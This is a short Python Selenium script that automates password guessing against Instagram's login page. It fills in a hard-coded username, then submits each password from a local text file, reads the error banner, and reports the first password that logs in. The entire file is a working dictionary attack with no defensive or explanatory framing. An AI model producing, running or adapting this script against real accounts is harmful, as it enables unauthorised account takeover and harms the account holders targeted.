from time import sleep
from dotenv import load_dotenv
import os
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

load_dotenv()

USERNAME = "tech_n_trickzz"
PASSWORD_FILE = "password.txt"

driver = webdriver.Chrome()
driver.maximize_window()

insta_url = 'https://www.instagram.com/'
driver.get(insta_url)

sleep(1)

username_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'username')))
username_field.send_keys(USERNAME)

sleep(1)

password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'password')))

# Read passwords from the password file
with open(PASSWORD_FILE, 'r') as file:
    passwords = file.read().splitlines()

login_successful = False

for password in passwords:
    password_field.clear()  # Clear the password field before entering a new password
    password_field.send_keys(password)

    sleep(1)

    login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="loginForm"]/div[1]/div[3]/button')))
    login_button.click()

    sleep(5)

    error_message = driver.find_elements(By.XPATH, '//*[@id="slfErrorAlert"]')

    if len(error_message) > 0 and error_message[0].text != "":
        print(f"Sorry, your password '{password}' was incorrect. Please double-check your password.")
        # Clear the password field by sending Backspace key
        password_field.send_keys("\b" * len(password))
        sleep(2)
    else:
        print(f"Login successful with password: {password}")
        login_successful = True
        break

if not login_successful:
    print("Unable to login with any of the passwords in the list.")

sleep(55)
driver.quit()
